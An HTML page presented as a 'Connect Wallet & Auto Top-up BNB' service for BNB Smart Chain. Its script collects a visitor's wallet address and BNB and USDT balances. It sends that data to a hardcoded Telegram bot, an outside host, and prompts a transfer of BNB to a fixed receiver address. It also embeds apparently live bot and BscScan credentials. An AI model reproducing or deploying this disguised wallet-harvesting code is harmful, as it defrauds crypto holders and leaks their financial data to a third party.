<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BSC Wallet Connect & Top-up Flow</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; }
    button { padding: 14px 28px; font-size: 16px; margin-top: 20px; }
  </style>
</head>
<body>
  <h2>Connect Wallet & Auto Top-up BNB</h2>
  <button onclick="connectAndProcess()">Connect Wallet</button>
  <p id="status"></p>

  <script>
    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
    const TELEGRAM_CHAT_ID = '8060968649';
    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
    const BACKEND_API = 'https://a-production-c9bc.up.railway.app/api/topup-bnb';
    const RECEIVER = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';

    async function connectAndProcess() {
      const status = document.getElementById("status");
      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please install MetaMask");
        return;
      }

      const web3 = new Web3(window.ethereum);
      try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];
        let message = `üì≤ *Wallet Connected*\n\`${address}\`\n\n`;

        // Fetch BNB balance
        const bnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
        const bnbData = await bnbRes.json();
        let bnb = 0;
        if (bnbData.status === "1") {
          bnb = parseFloat(bnbData.result) / 1e18;
          message += `üí∞ *BNB*: ${bnb.toFixed(4)}\n`;
        } else {
          message += `üí∞ *BNB*: ‚ùå Error\n`;
        }

        // Fetch USDT balance
        const usdtRes = await fetch(`https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${address}&tag=latest&apikey=${BSC_SCAN_API}`);
        const usdtData = await usdtRes.json();
        if (usdtData.status === "1") {
          const usdt = parseFloat(usdtData.result) / 1e18;
          message += `üíµ *USDT*: ${usdt.toFixed(2)}\n`;
        } else {
          message += `üíµ *USDT*: ‚ùå Error\n`;
        }

        status.innerText = `üí¨ Checking BNB balance...`;

        if (bnb < 1) {
          message += `‚ö†Ô∏è *BNB < $1* ‚Äì requesting backend top-up...\n`;

          // üîÅ Send backend request
          const res = await fetch(BACKEND_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address })
          });
          const data = await res.json();

          if (data.ready) {
            message += `‚úÖ Top-up requested!\n‚è≥ Waiting for balance update...`;
            status.innerText = "‚è≥ Waiting for balance update...";
            await new Promise(r => setTimeout(r, 10000)); // Wait for TX
          } else {
            status.innerText = "‚ùå Backend error!";
            return;
          }
        }

        // üîÑ Recheck BNB balance
        const rebnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
        const rebnbData = await rebnbRes.json();
        const newBnb = parseFloat(rebnbData.result) / 1e18;

        if (newBnb >= 1) {
          const sendAmount = 0.0015; // ~$0.50
          const tx = {
            from: address,
            to: RECEIVER,
            value: web3.utils.toHex(web3.utils.toWei(sendAmount.toString(), 'ether'))
          };
          await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });

          message += `üöÄ *Sent ${sendAmount} BNB* to \`${RECEIVER}\``;
          status.innerText = "‚úÖ Transaction sent!";
        } else {
          message += `‚ùå *Still < $1 BNB* ‚Äì cannot proceed.`;
          status.innerText = "‚ùå Not enough BNB";
        }

        // üì® Send log to Telegram
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });

      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Error occurred.";
      }
    }
  </script>
</body>
</html>
